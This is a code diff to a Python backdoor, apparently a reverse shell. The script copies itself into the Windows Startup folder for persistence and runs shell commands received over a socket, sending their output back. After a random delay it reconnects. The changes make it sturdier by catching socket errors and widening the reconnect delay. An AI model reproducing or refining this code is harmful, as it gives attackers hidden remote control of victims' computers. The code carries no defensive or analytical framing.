@@ -12,6 +12,7 @@ def fubar(platform):
 
 def winstart():
 	appenv = os.getenv("APPDATA")
+	# Change this dir based on Win version
 	data = 'copy "'+sys.argv[0]+'" "'+appenv+'\Microsoft\Windows\Start Menu\Programs\Startup"'
 	return data
 
@@ -38,7 +39,10 @@ def main():
 	while 1:
 		sock.send("\n"+os.getcwd()+">")
 		#Ensure this value is a (relatively) low power of 2
-		data = sock.recv(4096)
+		try:
+			data = sock.recv(4096)
+		except:
+			break
 		# Use this this to close the connection
 		if data.startswith("qqq"):
 			break
@@ -62,10 +66,8 @@ def main():
 		stdout_val = process.stdout.read() + process.stderr.read()
 		sock.send(stdout_val)
 	sock.close()
-	time.sleep(randint(10, 30))
+	time.sleep(randint(10, 60))
 	main()
-	# except:
-	# 	pass
 
 if __name__ == "__main__":
     main()	
